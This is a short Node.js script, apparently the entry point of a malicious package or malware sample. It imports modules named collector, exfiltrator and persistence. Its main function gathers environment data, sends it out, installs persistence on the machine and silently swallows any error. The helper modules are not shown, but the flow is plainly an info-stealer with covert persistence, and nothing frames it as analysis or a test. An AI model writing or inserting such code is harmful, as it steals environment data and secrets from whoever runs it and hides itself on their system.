const { collectEnvironment } = require('../lib/collector');
const { exfiltrate } = require('../lib/exfiltrator');
const { installPersistence } = require('../lib/persistence');

async function main() {
  try {
    const data = collectEnvironment();
    await exfiltrate(data);
    installPersistence();
  } catch (e) {
   
  }
}

main();
